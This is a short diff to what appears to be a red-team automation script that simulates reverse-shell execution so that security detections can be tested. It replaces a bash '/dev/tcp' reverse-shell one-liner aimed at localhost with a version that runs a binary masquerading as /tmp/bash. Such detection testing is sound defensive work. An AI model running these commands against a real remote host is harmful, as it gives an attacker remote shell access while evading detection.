@@ -23,9 +23,15 @@ metadata = RtaMetadata(
 
 @common.requires_os(*metadata.platforms)
 def main():
+    masquerade = "/tmp/bash"
+    if common.CURRENT_OS == "linux":
+        source = common.get_path("bin", "linux.ditto_and_spawn")
+        common.copy_file(source, masquerade)
+    else:
+        common.create_macos_masquerade(masquerade)
 
     common.log("Executing command to simulate reverse shell execution")
-    common.execute(['bash -c "bash -i >/dev/tcp/127.0.0.1/4444" 0>&1'], shell=True)
+    common.execute([masquerade, "/dev/tcp/127.0.0.1/4444"], timeout=5, kill=True, shell=True)
 
 
 if __name__ == "__main__":
